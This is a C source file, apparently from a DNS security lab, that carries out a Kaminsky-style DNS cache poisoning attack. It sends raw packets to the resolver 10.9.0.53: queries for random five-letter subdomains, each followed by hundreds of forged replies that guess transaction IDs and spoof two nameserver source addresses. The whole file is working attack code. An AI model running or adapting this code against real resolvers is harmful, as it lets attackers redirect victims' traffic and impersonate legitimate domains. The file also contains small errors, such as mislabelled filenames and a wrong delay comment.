#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include<time.h>

#define MAX_FILE_SIZE 2000
#define TARGET_IP "10.9.0.53" 
int send_packet_raw (int sock, char *ip, int n);
char* GenerateRand();

int main()
{
	// Create raw socket
	int enable=1;
	int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
	setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &enable, sizeof(enable));
	
	//####read Query.bin to ip1[] Start #########
	FILE *f1 = fopen("ip_req.bin", "rb");
	if (!f1) 
	{
		perror("Can't open 'Query.bin'");
		exit(0);
	} 
	unsigned char ip1[MAX_FILE_SIZE];
	int n1 = fread(ip1, 1, MAX_FILE_SIZE, f1);
	//####read Query.bin End #########
	
	
	//####read Reply.bin to ip2[]  Start #########
	FILE *f2 = fopen("ip_resp.bin", "rb");
	if (!f2) 
	{
		perror("Can't open 'Reply.bin'");
		exit(0);
	} 
	unsigned char ip2[MAX_FILE_SIZE];
	int n2 = fread(ip2, 1, MAX_FILE_SIZE, f2);
	//####read Reply.bin End#########
	
	srand((unsigned)time(NULL));
	for(int temp=0;temp<200;temp++) //重复200次
	{
		// #######send query Begin ############
		char*name=GenerateRand();
		// Modify the name in the question field (offset=41)
		memcpy(ip1+41,name, 5); 
		send_packet_raw(sock, ip1, n1);
		// #######send query End ############
		
		//  #######send Mult reply Begin #########
		//  Modify the name in the question field (offset=41)
		memcpy(ip2+41, name , 5); 
		// Modify the name in the answer field (offset=64)
		memcpy(ip2+64,name, 5);
		// Modify the IP addr in the src IP field (offset=14) 199.43.133.53->199.43.135.53
		char c='\x87';
		memcpy(ip2+14,&c, 1);
		for (int id=1; id<400; id++)
		{
			// Modify the transaction ID field (offset=28)
			unsigned short id_net_order;
			id_net_order = htons(id);
			memcpy(ip2+28, &id_net_order, 2); 
			// Send the IP packet out
			send_packet_raw(sock, ip2, n2);
		} 
		// Modify the IP addr in the src IP field (offset=14) 199.43.135.53->199.43.133.53
		char c2='\x85';
		memcpy(ip2+14,&c2, 1); 
		for (int id=1; id<400; id++)
		{
			// Modify the transaction ID field (offset=28)
			unsigned short id_net_order;
			id_net_order = htons(id);
			memcpy(ip2+28, &id_net_order, 2); 
			// Send the IP packet out
			send_packet_raw(sock, ip2, n2);
		}
		// #######send Mult Reply End#########
		
		
		free(name);
		name=NULL; // A good habit for security
		printf("######\thave tried %d\t times, Start Next######### \n",temp);
		usleep(1000); //1000ms delay
	}
	close(sock);
}

char* GenerateRand()
{
	char a[26]="abcdefghijklmnopqrstuvwxyz";
	// Generate a random name of length 5
	char*name=malloc(5);
	for (int k=0; k<5; k++)
		name[k] = a[rand() % 26];
	return name;
}


int send_packet_raw(int sock, char *ip, int n)
{
	struct sockaddr_in dest_info;
	dest_info.sin_family = AF_INET;
	dest_info.sin_addr.s_addr = inet_addr(TARGET_IP);
	int r = sendto(sock, ip, n, 0, (struct sockaddr *)&dest_info, sizeof(dest_info));
}


